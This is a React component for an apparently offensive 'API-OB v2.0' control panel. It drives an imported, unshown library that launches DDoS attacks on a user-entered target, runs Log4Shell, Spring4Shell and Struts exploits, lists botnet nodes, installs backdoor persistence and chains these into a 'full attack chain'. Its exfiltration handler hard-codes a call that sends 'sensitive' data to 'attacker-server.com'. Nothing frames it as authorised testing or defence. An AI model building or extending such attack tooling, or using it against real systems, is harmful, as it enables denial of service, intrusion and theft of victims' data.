'use client';

import { useState, useEffect } from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Textarea } from '@/components/ui/textarea';
import { Badge } from '@/components/ui/badge';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { 
  Play, 
  Stop, 
  RefreshCw, 
  Download, 
  Target, 
  Shield, 
  Zap,
  Server,
  Activity,
  AlertTriangle,
  CheckCircle,
  XCircle,
  Database,
  Network,
  HardDrive,
  Clock
} from 'lucide-react';
import APIOBComplete, { 
  AttackMethod, 
  ExploitEntry, 
  BotnetNode,
  DataExfiltration,
  PersistenceMechanism
} from '@/lib/api-ob-complete';

export default function APIOBInterface() {
  const [apiob] = useState(() => new APIOBComplete());
  const [target, setTarget] = useState('');
  const [attackMethod, setAttackMethod] = useState('syn-flood');
  const [exploitId, setExploitId] = useState('exploit-001');
  const [searchQuery, setSearchQuery] = useState('');
  const [consoleOutput, setConsoleOutput] = useState<string[]>([]);
  const [isLoading, setIsLoading] = useState(false);
  const [activeAttacks, setActiveAttacks] = useState<any[]>([]);
  const [botnetNodes, setBotnetNodes] = useState<BotnetNode[]>([]);
  const [exploitResults, setExploitResults] = useState<any[]>([]);
  const [exfilOperations, setExfilOperations] = useState<DataExfiltration[]>([]);
  const [persistenceMethods, setPersistenceMethods] = useState<PersistenceMechanism[]>([]);

  const addConsoleMessage = (message: string, type: 'info' | 'success' | 'error' = 'info') => {
    const timestamp = new Date().toLocaleTimeString();
    const prefix = type === 'success' ? '✅' : type === 'error' ? '❌' : 'ℹ️';
    setConsoleOutput(prev => [...prev, `[${timestamp}] ${prefix} ${message}`]);
  };

  const startDDoSAttack = async () => {
    if (!target) {
      addConsoleMessage('Please enter a target', 'error');
      return;
    }

    setIsLoading(true);
    addConsoleMessage(`Starting ${attackMethod} attack on ${target}...`, 'info');

    try {
      const result = await apiob.ddosManager.startAttack(target, attackMethod);
      
      if (result.success) {
        addConsoleMessage(result.message, 'success');
        updateActiveAttacks();
      } else {
        addConsoleMessage('Attack failed', 'error');
      }
    } catch (error) {
      addConsoleMessage(`Error: ${error}`, 'error');
    } finally {
      setIsLoading(false);
    }
  };

  const executeExploit = async () => {
    if (!target) {
      addConsoleMessage('Please enter a target', 'error');
      return;
    }

    setIsLoading(true);
    addConsoleMessage(`Executing exploit ${exploitId} on ${target}...`, 'info');

    try {
      const result = apiob.exploitDatabase.executeExploit(target, exploitId);
      
      setExploitResults(prev => [...prev, result]);
      addConsoleMessage(result.result, result.success ? 'success' : 'error');
    } catch (error) {
      addConsoleMessage(`Error: ${error}`, 'error');
    } finally {
      setIsLoading(false);
    }
  };

  const searchExploits = () => {
    const results = apiob.exploitDatabase.searchExploits(searchQuery);
    addConsoleMessage(`Found ${results.length} exploits matching "${searchQuery}"`, 'info');
    return results;
  };

  const startDataExfiltration = async () => {
    if (!target) {
      addConsoleMessage('Please enter a source target', 'error');
      return;
    }

    setIsLoading(true);
    addConsoleMessage(`Starting data exfiltration from ${target}...`, 'info');

    try {
      const operationId = apiob.dataExfiltration.startExfiltration(target, 'attacker-server.com', {
        dataType: 'sensitive',
        size: '2.5 GB',
        method: 'encrypted_tunnel'
      });
      
      addConsoleMessage(`Data exfiltration operation ${operationId} started`, 'success');
      updateExfilOperations();
    } catch (error) {
      addConsoleMessage(`Error: ${error}`, 'error');
    } finally {
      setIsLoading(false);
    }
  };

  const installPersistence = async (methodId: string) => {
    if (!target) {
      addConsoleMessage('Please enter a target', 'error');
      return;
    }

    setIsLoading(true);
    addConsoleMessage(`Installing persistence mechanism ${methodId} on ${target}...`, 'info');

    try {
      const result = apiob.persistence.installPersistence(target, methodId);
      
      addConsoleMessage(result.result, result.success ? 'success' : 'error');
    } catch (error) {
      addConsoleMessage(`Error: ${error}`, 'error');
    } finally {
      setIsLoading(false);
    }
  };

  const executeFullAttackChain = async () => {
    if (!target) {
      addConsoleMessage('Please enter a target', 'error');
      return;
    }

    setIsLoading(true);
    addConsoleMessage(`Starting full attack chain on ${target}...`, 'info');

    try {
      const result = await apiob.executeFullAttackChain(target);
      
      result.results.forEach((phaseResult: any, index: number) => {
        setTimeout(() => {
          addConsoleMessage(
            `Phase ${index + 1} - ${phaseResult.phase}: ${phaseResult.result}`,
            phaseResult.success !== false ? 'success' : 'error'
          );
        }, index * 2000);
      });

      addConsoleMessage(
        `Attack chain completed in ${result.duration} with ${result.phases} phases`,
        'success'
      );
    } catch (error) {
      addConsoleMessage(`Error: ${error}`, 'error');
    } finally {
      setIsLoading(false);
    }
  };

  const updateActiveAttacks = () => {
    const attacks = apiob.ddosManager.getAllAttacks();
    setActiveAttacks(attacks);
  };

  const updateExfilOperations = () => {
    const operations = apiob.dataExfiltration.getAllOperations();
    setExfilOperations(operations);
  };

  const clearConsole = () => {
    setConsoleOutput([]);
  };

  const exportResults = () => {
    const data = {
      systemStatus: apiob.getSystemStatus(),
      exploitResults,
      activeAttacks,
      exfilOperations,
      timestamp: new Date().toISOString()
    };
    
    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `api-ob-results-${Date.now()}.json`;
    a.click();
    URL.revokeObjectURL(url);
    
    addConsoleMessage('Results exported successfully', 'success');
  };

  useEffect(() => {
    const interval = setInterval(() => {
      updateActiveAttacks();
      updateExfilOperations();
    }, 5000);

    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    const methods = apiob.persistence.getAllMechanisms();
    setPersistenceMethods(methods);
    
    const nodes = apiob.botnetManager.getAllNodes();
    setBotnetNodes(nodes);
  }, []);

  const attackMethods = apiob.ddosManager.getAttackMethods();
  const systemStatus = apiob.getSystemStatus();

  return (
    <div className="min-h-screen bg-black text-green-400 p-6">
      <div className="max-w-7xl mx-auto">
        <div className="text-center mb-8">
          <h1 className="text-4xl font-bold text-orange-500 mb-2 flex items-center justify-center gap-3">
            <Network className="w-10 h-10" />
            API-OB v2.0 - Offensive Security API
            <Network className="w-10 h-10" />
          </h1>
          <p className="text-green-300 text-lg">
            Advanced API-driven offensive security framework
          </p>
        </div>

        {/* System Status Overview */}
        <Card className="bg-gray-900 border border-orange-500 mb-6">
          <CardHeader>
            <CardTitle className="text-orange-400 flex items-center gap-2">
              <Activity className="w-6 h-6" />
              System Status Overview
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
              <div className="text-center">
                <div className="text-2xl font-bold text-orange-400">
                  {systemStatus.ddos.activeAttacks}
                </div>
                <div className="text-sm text-green-300">Active DDoS</div>
              </div>
              <div className="text-center">
                <div className="text-2xl font-bold text-orange-400">
                  {systemStatus.exploits.totalExploits}
                </div>
                <div className="text-sm text-green-300">Total Exploits</div>
              </div>
              <div className="text-center">
                <div className="text-2xl font-bold text-orange-400">
                  {systemStatus.botnet.total}
                </div>
                <div className="text-sm text-green-300">Botnet Nodes</div>
              </div>
              <div className="text-center">
                <div className="text-2xl font-bold text-orange-400">
                  {systemStatus.persistence.totalMechanisms}
                </div>
                <div className="text-sm text-green-300">Persistence Methods</div>
              </div>
            </div>
          </CardContent>
        </Card>

        <Tabs defaultValue="ddos" className="space-y-6">
          <TabsList className="bg-gray-900 border border-orange-500">
            <TabsTrigger value="ddos" className="data-[state=active]:bg-orange-900">
              <Zap className="w-4 h-4 mr-2" />
              DDoS Attacks
            </TabsTrigger>
            <TabsTrigger value="exploits" className="data-[state=active]:bg-orange-900">
              <Target className="w-4 h-4 mr-2" />
              Exploit Database
            </TabsTrigger>
            <TabsTrigger value="botnet" className="data-[state=active]:bg-orange-900">
              <Server className="w-4 h-4 mr-2" />
              Botnet Control
            </TabsTrigger>
            <TabsTrigger value="exfiltration" className="data-[state=active]:bg-orange-900">
              <Download className="w-4 h-4 mr-2" />
              Data Exfiltration
            </TabsTrigger>
            <TabsTrigger value="persistence" className="data-[state=active]:bg-orange-900">
              <HardDrive className="w-4 h-4 mr-2" />
              Persistence
            </TabsTrigger>
            <TabsTrigger value="chain" className="data-[state=active]:bg-orange-900">
              <Activity className="w-4 h-4 mr-2" />
              Attack Chain
            </TabsTrigger>
          </TabsList>

          {/* DDoS Tab */}
          <TabsContent value="ddos">
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <Card className="bg-gray-900 border border-orange-500">
                <CardHeader>
                  <CardTitle className="text-orange-400">DDoS Attack Configuration</CardTitle>
                  <CardDescription>Configure and launch DDoS attacks</CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div>
                    <Label htmlFor="target">Target IP/Domain</Label>
                    <Input
                      id="target"
                      value={target}
                      onChange={(e) => setTarget(e.target.value)}
                      placeholder="192.168.1.1 or example.com"
                      className="bg-gray-800 border-orange-500 text-green-300"
                    />
                  </div>
                  
                  <div>
                    <Label htmlFor="attackMethod">Attack Method</Label>
                    <Select value={attackMethod} onValueChange={setAttackMethod}>
                      <SelectTrigger className="bg-gray-800 border-orange-500">
                        <SelectValue />
                      </SelectTrigger>
                      <SelectContent className="bg-gray-800 border-orange-500">
                        {attackMethods.map((method) => (
                          <SelectItem key={method.id} value={method.id}>
                            {method.name} - {method.description}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>

                  <div className="flex gap-2">
                    <Button 
                      onClick={startDDoSAttack} 
                      disabled={isLoading}
                      className="bg-orange-600 hover:bg-orange-700"
                    >
                      <Play className="w-4 h-4 mr-2" />
                      Launch Attack
                    </Button>
                    
                    <Button 
                      onClick={updateActiveAttacks}
                      className="bg-green-600 hover:bg-green-700"
                    >
                      <RefreshCw className="w-4 h-4 mr-2" />
                      Refresh
                    </Button>
                  </div>
                </CardContent>
              </Card>

              <Card className="bg-gray-900 border border-orange-500">
                <CardHeader>
                  <CardTitle className="text-orange-400">Active Attacks</CardTitle>
                  <CardDescription>Monitor running attacks</CardDescription>
                </CardHeader>
                <CardContent>
                  <div className="space-y-2 max-h-64 overflow-y-auto">
                    {activeAttacks.map((attack) => (
                      <div key={attack.id} className="flex items-center justify-between p-2 bg-gray-800 rounded border border-orange-500">
                        <div>
                          <div className="font-mono text-sm">{attack.target}</div>
                          <div className="text-xs text-green-300">{attack.method.name}</div>
                          <div className="text-xs text-green-400">
                            Packets: {attack.stats.packetsSent.toLocaleString()} | 
                            Bandwidth: {attack.stats.bandwidth} Mbps | 
                            Success: {attack.stats.successRate.toFixed(1)}%
                          </div>
                        </div>
                        <Badge className={attack.status === 'running' ? 'bg-red-600' : 'bg-green-600'}>
                          {attack.status}
                        </Badge>
                        {attack.status === 'running' && (
                          <Button
                            size="sm"
                            variant="destructive"
                            onClick={() => {
                              apiob.ddosManager.stopAttack(attack.id);
                              updateActiveAttacks();
                            }}
                            className="ml-2"
                          >
                            <Stop className="w-3 h-3" />
                          </Button>
                        )}
                      </div>
                    ))}
                    {activeAttacks.length === 0 && (
                      <div className="text-center text-green-300 py-4">
                        No active attacks
                      </div>
                    )}
                  </div>
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          {/* Exploits Tab */}
          <TabsContent value="exploits">
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
              <Card className="bg-gray-900 border border-orange-500">
                <CardHeader>
                  <CardTitle className="text-orange-400">Exploit Search</CardTitle>
                  <CardDescription>Search exploit database</CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div>
                    <Label htmlFor="searchQuery">Search Query</Label>
                    <Input
                      id="searchQuery"
                      value={searchQuery}
                      onChange={(e) => setSearchQuery(e.target.value)}
                      placeholder="CVE-2021-44228 or Apache"
                      className="bg-gray-800 border-orange-500 text-green-300"
                    />
                  </div>
                  
                  <Button 
                    onClick={searchExploits}
                    className="bg-orange-600 hover:bg-orange-700 w-full"
                  >
                    <Database className="w-4 h-4 mr-2" />
                    Search Exploits
                  </Button>
                </CardContent>
              </Card>

              <Card className="bg-gray-900 border border-orange-500">
                <CardHeader>
                  <CardTitle className="text-orange-400">Exploit Execution</CardTitle>
                  <CardDescription>Execute selected exploit</CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div>
                    <Label htmlFor="exploitId">Exploit ID</Label>
                    <Select value={exploitId} onValueChange={setExploitId}>
                      <SelectTrigger className="bg-gray-800 border-orange-500">
                        <SelectValue />
                      </SelectTrigger>
                      <SelectContent className="bg-gray-800 border-orange-500">
                        {systemStatus.exploits.bySeverity.Critical > 0 && (
                          <SelectItem value="exploit-001">Critical - Apache Struts OGNL</SelectItem>
                        )}
                        {systemStatus.exploits.bySeverity.Critical > 0 && (
                          <SelectItem value="exploit-002">Critical - Log4Shell RCE</SelectItem>
                        )}
                        {systemStatus.exploits.bySeverity.High > 0 && (
                          <SelectItem value="exploit-003">Critical - Spring4Shell RCE</SelectItem>
                        )}
                      </SelectContent>
                    </Select>
                  </div>
                  
                  <Button 
                    onClick={executeExploit}
                    disabled={isLoading}
                    className="bg-red-600 hover:bg-red-700 w-full"
                  >
                    <Target className="w-4 h-4 mr-2" />
                    Execute Exploit
                  </Button>
                </CardContent>
              </Card>

              <Card className="bg-gray-900 border border-orange-500">
                <CardHeader>
                  <CardTitle className="text-orange-400">Exploit Statistics</CardTitle>
                  <CardDescription>Database overview</CardDescription>
                </CardHeader>
                <CardContent>
                  <div className="space-y-2">
                    <div className="flex justify-between">
                      <span className="text-green-300">Critical:</span>
                      <Badge className="bg-red-600">{systemStatus.exploits.bySeverity.Critical}</Badge>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-green-300">High:</span>
                      <Badge className="bg-orange-600">{systemStatus.exploits.bySeverity.High}</Badge>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-green-300">Medium:</span>
                      <Badge className="bg-yellow-600">{systemStatus.exploits.bySeverity.Medium || 0}</Badge>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-green-300">Low:</span>
                      <Badge className="bg-blue-600">{systemStatus.exploits.bySeverity.Low || 0}</Badge>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          {/* Botnet Tab */}
          <TabsContent value="botnet">
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <Card className="bg-gray-900 border border-orange-500">
                <CardHeader>
                  <CardTitle className="text-orange-400">Botnet Statistics</CardTitle>
                  <CardDescription>Network overview</CardDescription>
                </CardHeader>
                <CardContent>
                  <div className="grid grid-cols-2 gap-4">
                    <div className="text-center">
                      <div className="text-2xl font-bold text-orange-400">
                        {systemStatus.botnet.total}
                      </div>
                      <div className="text-sm text-green-300">Total Nodes</div>
                    </div>
                    <div className="text-center">
                      <div className="text-2xl font-bold text-green-400">
                        {systemStatus.botnet.active}
                      </div>
                      <div className="text-sm text-green-300">Active</div>
                    </div>
                    <div className="text-center">
                      <div className="text-2xl font-bold text-yellow-400">
                        {systemStatus.botnet.idle}
                      </div>
                      <div className="text-sm text-green-300">Idle</div>
                    </div>
                    <div className="text-center">
                      <div className="text-2xl font-bold text-red-400">
                        {systemStatus.botnet.dead}
                      </div>
                      <div className="text-sm text-green-300">Dead</div>
                    </div>
                  </div>
                </CardContent>
              </Card>

              <Card className="bg-gray-900 border border-orange-500">
                <CardHeader>
                  <CardTitle className="text-orange-400">Botnet Nodes</CardTitle>
                  <CardDescription>Connected nodes</CardDescription>
                </CardHeader>
                <CardContent>
                  <div className="space-y-2 max-h-64 overflow-y-auto">
                    {botnetNodes.slice(0, 10).map((node) => (
                      <div key={node.id} className="flex items-center justify-between p-2 bg-gray-800 rounded border border-orange-500">
                        <div>
                          <div className="font-mono text-sm">{node.ip}:{node.port}</div>
                          <div className="text-xs text-green-300">{node.os} | {node.country}</div>
                          <div className="text-xs text-green-400">
                            {node.cpu} | {node.memory} | {node.bandwidth}
                          </div>
                        </div>
                        <Badge className={
                          node.status === 'active' ? 'bg-green-600' :
                          node.status === 'idle' ? 'bg-yellow-600' : 'bg-red-600'
                        }>
                          {node.status}
                        </Badge>
                      </div>
                    ))}
                    {botnetNodes.length === 0 && (
                      <div className="text-center text-green-300 py-4">
                        No botnet nodes available
                      </div>
                    )}
                  </div>
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          {/* Data Exfiltration Tab */}
          <TabsContent value="exfiltration">
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <Card className="bg-gray-900 border border-orange-500">
                <CardHeader>
                  <CardTitle className="text-orange-400">Data Exfiltration</CardTitle>
                  <CardDescription>Extract sensitive data</CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div>
                    <Label htmlFor="exfilTarget">Source Target</Label>
                    <Input
                      id="exfilTarget"
                      value={target}
                      onChange={(e) => setTarget(e.target.value)}
                      placeholder="192.168.1.100"
                      className="bg-gray-800 border-orange-500 text-green-300"
                    />
                  </div>
                  
                  <Button 
                    onClick={startDataExfiltration}
                    disabled={isLoading}
                    className="bg-orange-600 hover:bg-orange-700 w-full"
                  >
                    <Download className="w-4 h-4 mr-2" />
                    Start Exfiltration
                  </Button>
                </CardContent>
              </Card>

              <Card className="bg-gray-900 border border-orange-500">
                <CardHeader>
                  <CardTitle className="text-orange-400">Active Operations</CardTitle>
                  <CardDescription>Running exfiltration tasks</CardDescription>
                </CardHeader>
                <CardContent>
                  <div className="space-y-2 max-h-64 overflow-y-auto">
                    {exfilOperations.map((operation) => (
                      <div key={operation.id} className="p-2 bg-gray-800 rounded border border-orange-500">
                        <div className="flex justify-between items-center mb-1">
                          <div className="font-mono text-sm">{operation.id}</div>
                          <Badge className={
                            operation.status === 'completed' ? 'bg-green-600' :
                            operation.status === 'in_progress' ? 'bg-yellow-600' : 'bg-red-600'
                          }>
                            {operation.status}
                          </Badge>
                        </div>
                        <div className="text-xs text-green-300">
                          {operation.source} → {operation.destination}
                        </div>
                        <div className="text-xs text-green-400">
                          {operation.dataType} | {operation.size} | {operation.method}
                        </div>
                        {operation.status === 'in_progress' && (
                          <div className="mt-2">
                            <div className="w-full bg-gray-700 rounded-full h-2">
                              <div 
                                className="bg-orange-600 h-2 rounded-full" 
                                style={{ width: `${operation.progress}%` }}
                              ></div>
                            </div>
                            <div className="text-xs text-center mt-1">
                              {operation.progress.toFixed(1)}%
                            </div>
                          </div>
                        )}
                      </div>
                    ))}
                    {exfilOperations.length === 0 && (
                      <div className="text-center text-green-300 py-4">
                        No active exfiltration operations
                      </div>
                    )}
                  </div>
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          {/* Persistence Tab */}
          <TabsContent value="persistence">
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <Card className="bg-gray-900 border border-orange-500">
                <CardHeader>
                  <CardTitle className="text-orange-400">Persistence Methods</CardTitle>
                  <CardDescription>Available persistence techniques</CardDescription>
                </CardHeader>
                <CardContent>
                  <div className="space-y-2 max-h-64 overflow-y-auto">
                    {persistenceMethods.map((method) => (
                      <div key={method.id} className="p-2 bg-gray-800 rounded border border-orange-500">
                        <div className="flex justify-between items-center mb-1">
                          <div className="font-semibold text-sm">{method.name}</div>
                          <Badge className={
                            method.detection_difficulty === 'Expert' ? 'bg-red-600' :
                            method.detection_difficulty === 'Hard' ? 'bg-orange-600' :
                            method.detection_difficulty === 'Medium' ? 'bg-yellow-600' : 'bg-green-600'
                          }>
                            {method.detection_difficulty}
                          </Badge>
                        </div>
                        <div className="text-xs text-green-300 mb-1">{method.description}</div>
                        <div className="text-xs text-green-400 font-mono">{method.location}</div>
                        <Button
                          size="sm"
                          onClick={() => installPersistence(method.id)}
                          disabled={isLoading}
                          className="mt-2 bg-orange-600 hover:bg-orange-700"
                        >
                          Install
                        </Button>
                      </div>
                    ))}
                    {persistenceMethods.length === 0 && (
                      <div className="text-center text-green-300 py-4">
                        No persistence methods available
                      </div>
                    )}
                  </div>
                </CardContent>
              </Card>

              <Card className="bg-gray-900 border border-orange-500">
                <CardHeader>
                  <CardTitle className="text-orange-400">Persistence Statistics</CardTitle>
                  <CardDescription>Installation methods overview</CardDescription>
                </CardHeader>
                <CardContent>
                  <div className="space-y-2">
                    <div className="flex justify-between">
                      <span className="text-green-300">Registry:</span>
                      <Badge className="bg-blue-600">
                        {systemStatus.persistence.byType.registry}
                      </Badge>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-green-300">Service:</span>
                      <Badge className="bg-purple-600">
                        {systemStatus.persistence.byType.service}
                      </Badge>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-green-300">Scheduled Task:</span>
                      <Badge className="bg-indigo-600">
                        {systemStatus.persistence.byType.scheduled_task}
                      </Badge>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-green-300">Backdoor:</span>
                      <Badge className="bg-red-600">
                        {systemStatus.persistence.byType.backdoor}
                      </Badge>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          {/* Attack Chain Tab */}
          <TabsContent value="chain">
            <Card className="bg-gray-900 border border-orange-500">
              <CardHeader>
                <CardTitle className="text-orange-400">Full Attack Chain</CardTitle>
                <CardDescription>Execute complete offensive sequence</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div>
                  <Label htmlFor="chainTarget">Target System</Label>
                  <Input
                    id="chainTarget"
                    value={target}
                    onChange={(e) => setTarget(e.target.value)}
                    placeholder="Enter target IP or domain"
                    className="bg-gray-800 border-orange-500 text-green-300"
                  />
                </div>
                
                <div className="bg-gray-800 p-4 rounded border border-orange-500">
                  <h4 className="text-orange-300 font-semibold mb-2">Attack Phases:</h4>
                  <ol className="list-decimal list-inside space-y-1 text-sm text-green-300">
                    <li>Reconnaissance - Target scanning and analysis</li>
                    <li>Initial Access - Exploit vulnerabilities</li>
                    <li>Persistence - Install backdoors</li>
                    <li>Botnet Integration - Connect to infrastructure</li>
                    <li>Data Exfiltration - Extract sensitive data</li>
                    <li>DDoS Attack - Launch denial of service</li>
                  </ol>
                </div>
                
                <Button 
                  onClick={executeFullAttackChain}
                  disabled={isLoading}
                  className="bg-red-600 hover:bg-red-700 w-full"
                >
                  <Activity className="w-4 h-4 mr-2" />
                  Execute Full Attack Chain
                </Button>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>

        {/* Console Output */}
        <Card className="bg-gray-900 border border-orange-500 mt-6">
          <CardHeader className="flex flex-row items-center justify-between">
            <div>
              <CardTitle className="text-orange-400">Console Output</CardTitle>
              <CardDescription>Real-time operation logs</CardDescription>
            </div>
            <div className="flex gap-2">
              <Button
                size="sm"
                variant="outline"
                onClick={exportResults}
                className="border-orange-500 text-orange-300 hover:bg-orange-900"
              >
                <Download className="w-4 h-4 mr-2" />
                Export
              </Button>
              <Button
                size="sm"
                variant="outline"
                onClick={clearConsole}
                className="border-orange-500 text-orange-300 hover:bg-orange-900"
              >
                Clear
              </Button>
            </div>
          </CardHeader>
          <CardContent>
            <div className="bg-black p-4 rounded border border-orange-500 font-mono text-sm max-h-64 overflow-y-auto">
              {consoleOutput.map((line, index) => (
                <div key={index} className="text-green-300 whitespace-pre-wrap">
                  {line}
                </div>
              ))}
              {consoleOutput.length === 0 && (
                <div className="text-green-500 text-center">
                  Console ready. Execute commands to see output.
                </div>
              )}
            </div>
          </CardContent>
        </Card>

        {/* Results Summary */}
        <Card className="bg-gray-900 border border-orange-500 mt-6">
          <CardHeader>
            <CardTitle className="text-orange-400">Exploit Results</CardTitle>
            <CardDescription>Summary of successful operations</CardDescription>
          </CardHeader>
          <CardContent>
            <div className="space-y-2 max-h-48 overflow-y-auto">
              {exploitResults.slice(-10).map((result, index) => (
                <div key={index} className={`flex items-center gap-2 p-2 rounded border ${
                  result.success ? 'bg-green-900 border-green-500' : 'bg-red-900 border-red-500'
                }`}>
                  {result.success ? (
                    <CheckCircle className="w-4 h-4 text-green-400" />
                  ) : (
                    <XCircle className="w-4 h-4 text-red-400" />
                  )}
                  <div className="flex-1">
                    <div className="font-mono text-sm">{result.exploit?.name || result.method}</div>
                    <div className="text-xs text-gray-300">{result.result}</div>
                  </div>
                  <Badge variant={result.success ? 'success' : 'destructive'}>
                    {result.success ? 'SUCCESS' : 'FAILED'}
                  </Badge>
                </div>
              ))}
              {exploitResults.length === 0 && (
                <div className="text-center text-green-300 py-4">
                  No exploit results yet
                </div>
              )}
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
}